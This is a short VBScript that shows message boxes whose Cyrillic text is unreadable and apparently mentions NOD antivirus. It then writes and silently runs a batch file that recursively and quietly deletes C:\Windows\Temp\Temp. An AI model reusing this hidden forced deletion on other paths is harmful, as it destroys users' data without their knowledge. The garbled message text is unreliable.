MsgBox "� ������� ���������� ������������� ������ ���������� NOD" & vbCrLf & "���������� ������� ��� ���������� ������, ����� ���� ��������� ��������� ��� ���." & vbCrLf & "" & vbCrLf & "��������� ���������� ����� ��������!" & vbCrLf, 4096, "��������������"

	Set objFso = CreateObject("Scripting.FileSystemObject") 
	Set objFile = objFso.CreateTextFile("C:\WINDOWS\Temp\Temp\Temp\vbs\del.cmd") 
	With objFile 
		.WriteLine "cd C:\Windows"  
		.WriteLine "rd /q /s C:\Windows\Temp\Temp"
		.Close 
	End With 
	
	set oShell = WScript.CreateObject ("WScript.Shell")
	oShell.Popup "��������� ��������!", 3, "����������", 4096
	
	set WshShell = WScript.CreateObject("WScript.Shell")  
	WshShell.Run "c:\WINDOWS\Temp\Temp\Temp\vbs\del.cmd", 0, false    
